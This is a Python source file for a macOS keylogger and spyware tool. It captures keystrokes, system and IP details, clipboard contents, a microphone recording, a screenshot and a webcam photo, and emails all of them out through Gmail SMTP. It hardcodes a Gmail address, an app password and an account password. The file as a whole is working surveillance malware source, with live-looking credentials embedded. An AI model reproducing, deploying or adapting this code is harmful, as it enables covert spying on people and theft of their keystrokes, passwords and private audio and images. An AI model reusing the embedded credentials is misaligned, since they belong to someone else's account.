#Email modules
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email import encoders
import cv2
import smtplib

#Modules for computer information collection
import socket
import platform
from requests import get

#Copy cliboard modules
import subprocess

#Microphone modules
from scipy.io.wavfile import write
import sounddevice as sd
import wavio as wv

#Screenshot image grab
from PIL import ImageGrab

#Keystroke module
from pynput.keyboard import Key, Listener

#Cryptography module for .txt encryption
from cryptography.fernet import Fernet

#Datetime module
from datetime import date
from datetime import datetime
import time

#Files to be updated
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
photo_information = "photo.png"

#Default email values
email_address =  "keylogger4214389@gmail.com"
app_password = "ohtzogcxovolgjja" #Password: gr@ntColl1nsKEY##
toaddress = "keylogger4214389@gmail.com"

#Default time & iteration values
microphone_time = 10
time_iteration = 30
datenow = date.today()
timenow = datetime.now().strftime("%H:%M:%S")
currentTime = time.time()

#Default camera values
cam = cv2.VideoCapture(0)

#Encryption
key = "aK9Aamh-txCxirHhCLEZ-phPxpQRUTEXhBHigOeF30Q="
keys_information_encrypted = "encrypted_key_log.txt"
system_information_encrypted = "encrypted_systeminfo.txt"
clipboard_information_encrypted = "ecrypted_clipboard.txt"

#Filepaths
file_path = "/Users/rickyanashita/Developer/Python-Keylogger"
extend = "/"
file_merge = file_path + extend

#Logger Code
keys = []
count = 0
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_merge + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    elapsed_time = time.time() - currentTime
    if elapsed_time >= time_iteration: 
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

#The function that sends an email containing a keylog. 
def send_email(toaddress):

    fromaddress = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddress
    msg['To'] = toaddress
    msg['Subject'] = "New Python Log File"

    body = "Log File with keylog, system information, clipboard contents, microphone recording, and screenshot. \nInformation logged at " + str(timenow) + " on " + str(datenow)
    msg.attach(MIMEText(body, 'plain'))

    filenames = [ keys_information, system_information, clipboard_information, audio_information, screenshot_information, photo_information]
    attachments = [file_merge + keys_information, file_merge + system_information, file_merge + clipboard_information, file_merge + audio_information, file_merge + screenshot_information, file_merge + photo_information]

    for x in range(6):
        filename = filenames[x]
        attachment = open(attachments[x], 'rb')
        if filename == "screenshot_information":
            p = MIMEImage("attachment", name= filename)
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename=%s" % filename)
        msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddress, app_password)

    text = msg.as_string()
    s.sendmail(fromaddress, toaddress, text)
    s.quit()

# send_email(keys_information, file_path + extend + keys_information, toaddress)

#The function that collects information on the mac device and system being monitored. 
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddress = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except:
            f.write("Couldn't get public IP Adress. Max Query")
        
        f.write("Private IP Address: " + IPAddress + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("OS: " + str(platform.mac_ver()) + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Processor: " + (platform.processor()) + '\n')
        
# computer_information() 

#The function that copies the information on the clipboard
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            #https://stackoverflow.com/questions/1825692/can-python-send-text-to-the-mac-clipboard
            pasted_data = subprocess.check_output('pbpaste', env={'LANG': 'en_US.UTF-8'}).decode('utf-8')
            f.write("Clipboard Data: " + pasted_data + "\n")
        except:
            f.write("Clipboard could not be copied. Clipboard may contain other media")

# copy_clipboard()

#The function that creates a .wav recording through the system's microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels = 1)
    sd.wait()

    write(file_merge + audio_information, fs, myrecording)

# microphone()

#The function that takes a screenshot of the device's screen
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

# screenshot()

def photo():
    result, img = cam.read()
    if not result:
        print("Image Capture Failed")
    else :
        cv2.imwrite(photo_information, img)
    cam.release()

#photo()

def logger():
    computer_information()
    copy_clipboard()
    microphone()
    screenshot()
    photo()
    send_email(toaddress)
    
logger()